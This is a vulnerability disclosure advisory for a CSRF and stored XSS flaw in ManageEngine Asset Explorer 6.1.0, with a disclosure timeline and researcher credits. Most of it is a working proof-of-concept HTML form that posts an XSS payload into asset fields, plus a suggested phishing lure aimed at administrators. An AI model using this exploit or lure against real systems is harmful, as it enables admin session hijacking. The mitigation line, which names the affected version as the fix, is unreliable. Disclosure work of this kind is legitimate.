@@ -1,0 +1,129 @@
+===============================================================================
+CSRF/Stored XSS Vulnerability in  Manage Engine Asset Explorer
+===============================================================================
+
+. contents:: Table Of Content
+
+Overview
+========
+
+* Title :CSRF/Stored XSS vulnerability in Manage Engine Asset Explorer
+* Author: Kaustubh G. Padwad
+* Plugin Homepage: https://www.manageengine.com/products/asset-explorer/
+* Severity: HIGH
+* Version Affected: Version 6.1.0 Build: 6110
+* Version Tested : Version 6.1.0 Build: 6110
+* version patched: 
+* CVE ID : 
+Description 
+===========
+
+Vulnerable Parameter  
+--------------------
+
+* Too many parameters (All Device properties)
+
+
+   
+About Vulnerability
+-------------------
+This Product is vulnerable to a combination of CSRF/XSS attack meaning that if an admin user can be tricked to visit a crafted URL created by attacker (via spear phishing/social engineering), the attacker can execute arbitrary code into Asset list(AssetListView.do). Once exploited, admin’s browser can be made to do almost anything the admin user could typically do by hijacking admin's cookies etc. 
+
+Vulnerability Class
+===================     
+Cross Site Request Forgery (https://www.owasp.org/index.php/Cross-Site_Request_Forgery_%28CSRF%29)
+Cross Site Scripting       (https://www.owasp.org/index.php/Top_10_2013-A3-Cross-Site_Scripting_(XSS) 
+
+Steps to Reproduce: (POC)
+=========================
+* Add follwing code to webserver and send that malicious link to application Admin.
+* The admin should be loggedin when he clicks on the link.
+* Soical enginering might help here 
+
+For Example :- Device password has been changed click here to reset
+
+####################CSRF COde#######################
+
+<html>
+  <body>
+    <form action="http://192.168.1.25:8080/AssetDef.do" method="POST">
+      <input type="hidden" name="typeId" value="3" />
+      <input type="hidden" name="ciTypeId" value="11" />
+      <input type="hidden" name="ciId" value="null" />
+      <input type="hidden" name="ciName" value="<div/onmouseover='alert(1)'> style="x:">" />
+      <input type="hidden" name="assetName" value="<div/onmouseover='alert(1)'> style="x:">" />
+      <input type="hidden" name="componentID" value="3" />
+      <input type="hidden" name="CI_NetworkInfo_IPADDRESS" value="127.0.0.1" />
+      <input type="hidden" name="CI_RouterCI_NVRAMSIZE" value="12" />
+      <input type="hidden" name="CI_RouterCI_DRAMSIZE" value="12" />
+      <input type="hidden" name="CI_RouterCI_FLASHSIZE" value="12" />
+      <input type="hidden" name="CI_RouterCI_OSTYPE" value="12" />
+      <input type="hidden" name="CI_RouterCI_CPU" value="12" />
+      <input type="hidden" name="CI_RouterCI_ESTIMATEDBW" value="12" />
+      <input type="hidden" name="CI_RouterCI_OSVERSION" value="12" />
+      <input type="hidden" name="CI_RouterCI_FIRMWAREREVISION" value="12" />
+      <input type="hidden" name="CI_RouterCI_CPUREVISION" value="12" />
+      <input type="hidden" name="CI_RouterCI_CONFIGREGISTER" value="12" />
+      <input type="hidden" name="CI_NetworkInfo_IPNETMASK" value="12" />
+      <input type="hidden" name="CI_NetworkInfo_MACADDRESS" value="12" />
+      <input type="hidden" name="CI_BaseElement_IMPACTID" value="1" />
+      <input type="hidden" name="ciDescription" value="<div/onmouseover='alert(1)'> style="x:">" />
+
+      <input type="hidden" name="activeStateId" value="2" />
+      <input type="hidden" name="isStateChange" value="" />
+      <input type="hidden" name="resourceState" value="1" />
+      <input type="hidden" name="assignedType" value="Assign" />
+      <input type="hidden" name="asset" value="0" />
+      <input type="hidden" name="user" value="0" />
+      <input type="hidden" name="department" value="0" />
+      <input type="hidden" name="leaseStart" value="" />
+      <input type="hidden" name="leaseEnd" value="" />
+      <input type="hidden" name="site" value="-1" />
+      <input type="hidden" name="location" value="" />
+      <input type="hidden" name="vendorID" value="0" />
+      <input type="hidden" name="assetPrice" value="21" />
+      <input type="hidden" name="assetTag" value="" />
+      <input type="hidden" name="acqDate" value="" />
+      <input type="hidden" name="assetSerialNo" value="" />
+      <input type="hidden" name="expDate" value="" />
+      <input type="hidden" name="assetBarCode" value="" />
+      <input type="hidden" name="warrantyExpDate" value="" />
+      <input type="hidden" name="depreciationTypeId" value="" />
+      <input type="hidden" name="declinePercent" value="" />
+      <input type="hidden" name="usefulLife" value="" />
+      <input type="hidden" name="depreciationPercent" value="" />
+      <input type="hidden" name="salvageValue" value="" />
+      <input type="hidden" name="isProductInfoChanged" value="" />
+      <input type="hidden" name="assetID" value="" />
+      <input type="hidden" name="previousSite" value="" />
+      <input type="hidden" name="addAsset" value="Save" />
+      <input type="hidden" name="purchasecost" value="" />
+      <input type="hidden" name="modifycost" value="true" />
+      <input type="hidden" name="oldAssociatedVendor" value="" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+
+
+
+
+Mitigation 
+==========
+Update to version 6.1
+
+Change Log
+==========
+https://www.manageengine.com/products/asset-explorer/sp-readme.html
+
+Disclosure 
+==========
+30-March-2015 Reported to Developer
+27-April-2015 Fixed By Vendor
+credits
+=======
+* Kaustubh Padwad 
+* Information Security Researcher
+* kingkaustubh@me.com 
+* https://twitter.com/s3curityb3ast
+* http://breakthesec.com
+* https://www.linkedin.com/in/kaustubhpadwad
